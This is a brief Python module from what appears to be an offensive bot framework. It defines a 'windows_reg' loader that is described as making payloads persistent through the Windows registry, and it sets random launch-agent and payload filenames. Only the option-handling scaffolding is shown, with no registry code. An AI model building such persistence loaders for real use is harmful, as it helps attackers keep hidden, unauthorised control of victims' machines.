# -*- coding: utf-8 -*-
__author__ = "siddhant385"


from bot.loaders.helper import *


class Loader(LoaderABC):
    def get_info(self):
        return {
            "Author": ["siddhant385"],
            "Description": "Makes payloads persistent via a windows registry.",
            "References": []
        }

    def get_option_messages(self):
        return [
            ["Launch agent name (Leave empty for Appdata\Launcher): ","launchAgent"],
            ["Payload filename (Leave empty for <RANDOM>): ","PayloadName"]
        ]

    def get_options(self, set_options):
        launch_agent_name = set_options[0]
        payload_filename = set_options[1]

        if not launch_agent_name:
            launch_agent_name = "{}".format(random_string())

        if not payload_filename:
            payload_filename = random_string()

        return {
            "loader_name": "windows_reg",
            "launch_agent_name": launch_agent_name,
            "payload_filename": payload_filename
        }
